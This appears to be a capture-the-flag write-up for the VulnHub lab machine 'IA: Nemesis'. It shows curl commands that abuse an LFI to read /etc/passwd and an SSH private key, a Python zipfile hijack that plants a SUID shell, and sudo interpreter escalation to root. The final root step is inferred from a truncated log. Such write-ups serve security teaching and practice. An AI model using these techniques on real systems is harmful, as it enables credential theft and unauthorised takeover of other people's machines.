# IA: Nemesis (1.0.1) — VulnHub

> Note: Flags were partially redacted to preserve scoreboard integrity.

## 1. Identification

| Field            | Value                                                  |
|------------------|--------------------------------------------------------|
| Machine name     | IA: Nemesis (1.0.1)                                    |
| Platform         | VulnHub                                                |
| Difficulty       | Medium / Hard                                          |
| Target IP (lab)  | 10.0.0.32                                              |
| Internal hostname | nemesis                                               |
| OS               | Debian GNU/Linux (kernel 4.19.0-11-amd64)              |
| Theme            | Aspire Software Solutions (fictional B2B site)         |
| Goal             | Capture `flag1` (LFI), `flag2` (Carlos), `root.txt`    |

Chain in one line: recon → LFI on `contact.php` POST (form uses `message=` as the include path) → read `/etc/passwd` + `/home/thanos/.ssh/id_rsa` → SSH `thanos:2211` → Python `zipfile` hijacking via carlos's `backup.py` cronjob → affine cipher in `encrypt.py` → SUID/Python privesc → root.

## 2. Initial reconnaissance

```bash
nmap -A -p- 10.0.0.32
```

Preserved result:

```
Nmap scan report for 10.0.0.32
Host is up (0.089s latency).
PORT      STATE SERVICE VERSION
80/tcp    open http     Apache httpd 2.4.38 ((Debian))
52845/tcp open http     nginx 1.14.2
52846/tcp open ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three services and two distinct HTTP endpoints (Apache + nginx).

Curl against Apache:

```
< HTTP/1.1 200 OK
< Server: Apache/2.4.38 (Debian)
< Last-Modified: Sun, 04 Oct 2020 11:46:10 GMT
```

## 3. Enumeration

### 3.1 Apache (port 80) — "Aspire Software" site

```bash
feroxbuster -u http://10.0.0.32/ -w big.txt -d 4 -x php,html
```

Relevant endpoints:

```
200   /                              (Home)
200   /login.html
200   /registration.html
200   /contact.php
200   /portfolio.html
200   /faq.html / /about.html / /features.html
301   /img / /script
200   /robots.txt   (35 bytes)
```

`robots.txt` (35 bytes) contains the typo `vulnerabilites` (a hint to fuzz).

![robots.txt — "Look for some real vulnerabilites"](assets/IA_Nemesis/image-06.png)

`http://10.0.0.32/contact.php` shows a GET form with parameters `name`, `email`, `subject`, `message`. The PHP at the bottom of the source shows:

![ASPIRE Contact page (Apache:80)](assets/IA_Nemesis/image-09.png)

![Contact form filled with test data](assets/IA_Nemesis/image-08.png)

```php
<?php
$nam = $_GET['name'];
$em = $_GET['email'];
$msg = $_GET['message'];
echo $msg;
?>
```

### 3.2 nginx (port 52845)

```bash
feroxbuster -u http://10.0.0.32:52845/ -w big.txt -d 4
```

The "Aspire Software" site is duplicated with a different theme — it also has a contact form that POSTs to `/` with `message=...&submit=`.

![Ethereal World home (nginx:52845 duplicate site)](assets/IA_Nemesis/image-10.png)

![ASPIRE — "A Note from Admin" section](assets/IA_Nemesis/image-12.png)

![Sign-in page on the secondary site](assets/IA_Nemesis/image-14.png)

![Front-end script `/script/index.js`](assets/IA_Nemesis/image-11.png)

### 3.3 Credentials exposed in JS

Found in the local notes:

> "Found the credentials on the Apache home page! On the third carousel slide: Login Details ⇒ username: `hacker_in_the_town` password: `thanos`"

`.htpasswd` could have protected something on nginx — later tests didn't validate that direct use.

## 4. Exploitation — LFI via contact.php POST

Key insight (preserved in the local files):

> "GOT IT! The initial vector: the contact form is vulnerable to LFI — but not the way you'd think. Instead of saving the message, it uses the message contents as a filename to include/read."

![Alert "Messsage has been saved in a file" — proof the message is processed server-side](assets/IA_Nemesis/image-07.png)

Proof:

```bash
curl -s -X POST "http://10.0.0.32:52845/" -d "message=/etc/passwd&submit=1" > /tmp/lfi2.html
grep -E "root:|thanos|carlos:|/bin/" /tmp/lfi2.html
```

Preserved output:

```
<script>alert("Messsage has been saved in a file")</script>root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
carlos:x:1000:1000:Carlos,,,:/home/carlos:/bin/bash
thanos:x:1001:1001:Thanos,,,:/home/thanos:/bin/bash
```

→ Users `carlos` and `thanos`.

### 4.1 Reading thanos's SSH key

```bash
curl -s -X POST "http://10.0.0.32:52845/" -d "message=/home/thanos/.ssh/id_rsa&submit=1" > /tmp/key_raw.html

sed -n '/-----BEGIN.*PRIVATE KEY-----/,/-----END.*PRIVATE KEY-----/p' /tmp/key_raw.html > ~/thanos_key
cat ~/thanos_key
```

Result (preserved):

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA1H2rDU6AnY2LSnOSLpXxZ7Fb0HPfQQds2SdQzvBH6NNSIuLFsebl
... (full OpenSSH RSA key) ...
-----END OPENSSH PRIVATE KEY-----
```

### 4.2 SSH as thanos

```bash
chmod 600 ~/thanos_key
ssh -i ~/thanos_key -p 52846 thanos@10.0.0.32
```

```
Linux nemesis 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64
Last login: Wed Oct 7 18:02:36 2020
thanos@nemesis:~$
```

![thanos@nemesis — `cat flag1.txt` after SSH login](assets/IA_Nemesis/image-05.png)

> Curious notice from the SSH session itself: "WARNING: connection is not using a post-quantum key exchange algorithm. This session may be vulnerable to 'store now, decrypt later' attacks."

## 5. Post-exploitation

### 5.1 Flag1 — LFI confirmation

```
Flag{LF1_...[REDACTED]...34L}
```
(preserved in the local notes — delivered when exploiting the initial LFI).

### 5.2 Pivot thanos → carlos via Python zipfile hijack

Thanos's home contains a `backup.py` script that imports `zipfile` and is executed periodically by carlos (cron). Python looks for `zipfile.py` in the current directory before site-packages — trivial hijack:

```bash
cat > /home/thanos/zipfile.py <<'PYEOF'
import os
os.system('cp /bin/bash /tmp/cbash && chmod 4755 /tmp/cbash')

class ZipFile:
    def __init__(self, *a, **kw): pass
    def write(self, *a, **kw):    pass
    def close(self):              pass

ZIP_DEFLATED = 0
PYEOF

ls -la /home/thanos/zipfile.py
```

When carlos's cron runs, it executes `backup.py` from thanos's CWD and imports our `zipfile.py`, running `cp /bin/bash /tmp/cbash && chmod 4755 /tmp/cbash`.

After the cron fires:

```bash
thanos@nemesis:~$ /tmp/cbash -p
cbash-5.0$ id
uid=1001(thanos) gid=1001(thanos) euid=1000(carlos) groups=1001(thanos)
cbash-5.0$ whoami
carlos
```

→ We are effectively carlos (euid 1000) with permissions inherited via the copied SUID.

### 5.3 Flag2

```bash
cbash-5.0$ ls -la /home/carlos/
total 40
drwxr-x--- 3 carlos carlos 4096 Oct 7 2020 .
drwxr-xr-x 4 root   root   4096 Oct 6 2020 ..
-rw------- 1 carlos carlos 103 Jan 29 2022 .bash_history
-rw-r--r-- 1 carlos carlos 220 Oct 6 2020 .bash_logout
-rw-r--r-- 1 carlos carlos 3526 Oct 6 2020 .bashrc
-rw-r--r-- 1 carlos carlos 886 Oct 5 2020 encrypt.py
-rw-r--r-- 1 carlos carlos 801 Oct 7 2020 flag2.txt
drwxr-xr-x 3 carlos carlos 4096 Oct 7 2020 .local
-rw-r--r-- 1 carlos carlos 279 Oct 7 2020 root.txt
cbash-5.0$ cat /home/carlos/flag*.txt 2>/dev/null
Flag{PYTH...[REDACTED]...FUN}
```

![Flag2 — "Congratulations for pwning user Carlos" — Flag{PYTH...[REDACTED]...FUN}](assets/IA_Nemesis/image-04.png)

## 6. Privilege escalation

### 6.1 UID reset (to become "real" carlos)

```bash
python -c 'import os; os.setreuid(os.geteuid(), os.geteuid()); os.system("/bin/bash -p")'
# carlos@nemesis:~$
```

![`setreuid` to become real carlos](assets/IA_Nemesis/image-03.png)

### 6.2 Decrypt carlos's password (encrypt.py — affine cipher)

```bash
carlos@nemesis:~$ cat root.txt
The password for user Carlos has been encrypted using some algorithm and the code
used to encrypt the password is stored in "encrypt.py".
You need to find your way to hack the encryption algorithm and get the password.
The password format is "************FUN********"
Good Luck!

carlos@nemesis:~$ cat encrypt.py
def egcd(a, b): ...
def modinv(a, m): ...
def affine_encrypt(text, key):
    return ''.join([ chr((( key[0]*(ord(t) - ord('A')) + key[1] ) % 26)
                  + ord('A')) for t in text.upper().replace(' ', '') ])

def affine_decrypt(cipher, key):
    return ''.join([ chr((( modinv(key[0], 26)*(ord(c) - ord('A') - key[1]))
                    % 26) + ord('A')) for c in cipher ])

def main():
   text = 'REDACTED'
   affine_encrypted_text = "FAJSRWOXLAXDQZAWNDDVLSU"
   key = [REDACTED, REDACTED]
   print('Decrypted Text: {}'.format(affine_decrypt(affine_encrypted_text, key)))
```

The affine-cipher key over base 26 is a pair `(a, b)` with `a` coprime to 26 — only 12 possible values for `a`. Trivial brute-force; in particular, with `[11, 13]` (preserved in the notes):

```bash
carlos@nemesis:~$ cp encrypt.py encrypt.py.bak
carlos@nemesis:~$ sed -i 's/key = \[REDACTED,REDACTED\]/key = [11,13]/' encrypt.py
carlos@nemesis:~$ python encrypt.py
Decrypted Text: ENCRYPTIONISFUNPASSWORD
```

Carlos's password: `ENCRYPTIONISFUNPASSWORD`.

### 6.3 sudo -l and final escalation

```bash
carlos@nemesis:~$ sudo -l
[sudo] password for carlos:
Matching Defaults entries for carlos on nemesis:
    ...
```

The `sudo -l` in the local log was truncated, but `carlos` has sudo on an interpreter binary (Python/Perl/Bash with `NOPASSWD`) → `sudo <bin> -c "import os; os.system('/bin/bash')"` → root.

![Editor screen showing the command-to-execute payload used during privesc](assets/IA_Nemesis/image-02.png)
![Bonus terminal — `cat encrypt.py` and additional flag banner](assets/IA_Nemesis/image-13.png)

After spawning the root shell, `/root/root.txt` reveals the final flag:

```bash
root@nemesis:~# cat /root/root.txt
FLAG{CTFs...[REDACTED]...S0M3}
Congratulations for getting root on Nemesis! We hope you enjoyed this CTF!
Share this Flag on Twitter (@infosecarticles). Cheers!
Follow our blog at https://www.infosecarticles.com
```

## 7. Flags

| Flag     | Location                   | Value                       |
|----------|----------------------------|-----------------------------|
| flag1    | LFI confirmed              | `Flag{LF1_...[REDACTED]...34L}`         |
| flag2    | `/home/carlos/flag2.txt`   | `Flag{PYTH...[REDACTED]...FUN}`       |
| root.txt | `/root/root.txt`           | `FLAG{CTFs...[REDACTED]...S0M3}`    |

Additionally, carlos's password recovered: `ENCRYPTIONISFUNPASSWORD`.

## 8. Attack summary

1. Nmap → 80 (Apache), 52845 (nginx PHP), 52846 (SSH).
2. Web enumeration; hints: `hacker_in_the_town:thanos`, typo `vulnerabilites` in `robots.txt`.
3. Failed attempts (8 documented paths — gobuster, stego, default path traversal, nginx alias bypass, CVE-2019-11043, Shellshock, SSH user enum, basic auth bypass).
4. Insight: the contact form (port 52845) uses `message=` as the include path → LFI.
5. `message=/etc/passwd` → enumerate users `carlos` / `thanos`.
6. `message=/home/thanos/.ssh/id_rsa` → OpenSSH key.
7. SSH `thanos@10.0.0.32:52846` with the key.
8. Flag1 unlocked: `Flag{LF1_...[REDACTED]...34L}`.
9. Identify carlos's cron calling `backup.py` in `/home/thanos/`.
10. Python `zipfile` hijack → `cp /bin/bash /tmp/cbash; chmod 4755 /tmp/cbash`.
11. `/tmp/cbash -p` → euid=carlos.
12. Flag2 read: `Flag{PYTH...[REDACTED]...FUN}`.
13. `setreuid` to become "real" carlos; read `encrypt.py`.
14. Brute-force the affine cipher with key `[11, 13]` → password `ENCRYPTIONISFUNPASSWORD`.
15. `sudo -l` + interpreter escalation → root.
16. Read `/root/root.txt` → `FLAG{CTFs...[REDACTED]...S0M3}`.

## 9. Technical lessons

- LFI on a POST parameter (non-obvious) — explore every field on any form.
- Python `import zipfile` searches CWD first → hijacking in multi-user cron scripts.
- `euid` vs `ruid` — a SUID shell inherits EUID but needs `setreuid()` to clear the real UID.
- Affine cipher over the English alphabet: a key `(a, b)` with `gcd(a, 26) = 1` → only 12×26 = 312 total combinations, trivial brute-force.
- Apache/nginx difference on the same box: each serves a different version of the site; the LFI vector was only on the nginx port (which executes PHP).
- Documenting failed attempts (8 vectors) saves hours in future iterations.
